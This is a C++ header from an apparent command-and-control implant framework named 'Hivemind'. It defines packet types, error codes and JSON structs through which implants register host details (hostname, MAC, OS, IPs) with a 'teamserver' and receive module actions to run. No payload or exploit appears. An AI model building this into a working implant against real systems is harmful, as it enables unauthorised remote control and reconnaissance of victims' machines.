/** @file comms.hpp
 * @brief Defines the action structs used for communication.
 * @author Im_Adriano
 */
#ifndef HIVEMIND_IMPLANTFRAMEWORK_LIB_INCLUDE_COMMS_HPP_
#define HIVEMIND_IMPLANTFRAMEWORK_LIB_INCLUDE_COMMS_HPP_

#include <string>
#include <vector>
#include "module.hpp"
#include "json.hpp"

/** @namespace hivemind_lib
 * @brief The Hivemind library
 */
namespace hivemind_lib {

/**
 * @brief Enum for the different kinds of packets the framework sends and receives.
 */
enum PacketType {
  ERROR_CODE = -1,
  NO_ACTION = 0,
  ACTION_REQUEST = 1,
  ACTION_CODE = 2,
  ACTION_RESPONSE_CODE = 3,
  REGISTRATION_REQUEST_CODE = 4,
  REGISTRATION_RESPONSE_CODE = 5
};

/**
 * @brief Enum for the possible errors that can be sent and received by the framework.
 */
enum ErrorNum {
  NOT_REGISTERED = -1,
  UNKNOWN_MODULE = -2,
  UNKNOWN_MODULE_FUNCTION = -3,
  MISSING_REQUIRED_DATA = -4,
  MODULE_TIMEOUT = -5,
  DUPLICATE_REGISTRATION = -6,
  UNKNOWN_ERROR = -7
};

/**
 * @brief Stores information on the implant. Including it's primary IP and the UUID given by the teamserver.
 */
struct ImplantInfo {
  std::string UUID;
  std::string primaryIP;
};

/**
 * @brief Struct used to parse and action received from the teamserver.
 */
struct Action {
  std::string actionId;
  std::string module;
  std::string moduleFunc;
  std::string arguments;
};

/**
 * @brief Struct used to send a response to the teamserver.
 */
struct ActionResponse {
  std::string actionId;
  std::string response;
};

/**
 * @brief Struct used to parse/create packets received and sent to the teamserver.
 */
struct Packet {
  std::string fingerprint;
  ImplantInfo implantInfo;
  PacketType packetType;
  int numLeft;
  std::string data;
};

/**
 * @brief Struct to parse error packet from teamserver.
 */
struct Error {
  std::string actionId;
  ErrorNum errorNum;
};

/**
 * @brief Struct to create a registration request to register the bot with the teamserver.
 */
struct RegistrationRequest {
  std::string IP;
  std::string implantName;
  std::string implantVersion;
  std::string hostname;
  std::string MAC;
  std::vector<std::string> otherIPs;
  std::string OS;
  std::vector<ModuleInfo> supportedModules;
};

/**
 * @brief Used to parse the registration response sent by the teamserver.
 */
struct RegistrationResponse {
  std::string UUID;
};

/**
 * @brief Generate json parsing functions for struct.
 */
NLOHMANN_DEFINE_TYPE_NON_INTRUSIVE(ImplantInfo, UUID, primaryIP);

/**
 * @brief Generate json parsing functions for struct.
 */
NLOHMANN_DEFINE_TYPE_NON_INTRUSIVE(ActionResponse, actionId, response);

/**
 * @brief Generate json parsing functions for struct.
 */
NLOHMANN_DEFINE_TYPE_NON_INTRUSIVE(Action, actionId, module, moduleFunc, arguments);

/**
 * @brief Generate json parsing functions for struct.
 */
NLOHMANN_DEFINE_TYPE_NON_INTRUSIVE(Error, actionId, errorNum);

/**
 * @brief Generate json parsing functions for struct.
 */
NLOHMANN_DEFINE_TYPE_NON_INTRUSIVE(RegistrationRequest,
                                   IP,
                                   implantName,
                                   implantVersion,
                                   hostname,
                                   MAC,
                                   otherIPs,
                                   OS,
                                   supportedModules);

/**
 * @brief Generate json parsing functions for struct.
 */
NLOHMANN_DEFINE_TYPE_NON_INTRUSIVE(Packet, fingerprint, implantInfo, packetType, numLeft, data);

/**
 * @brief Generate json parsing functions for struct.
 */
NLOHMANN_DEFINE_TYPE_NON_INTRUSIVE(RegistrationResponse, UUID);

}

#endif
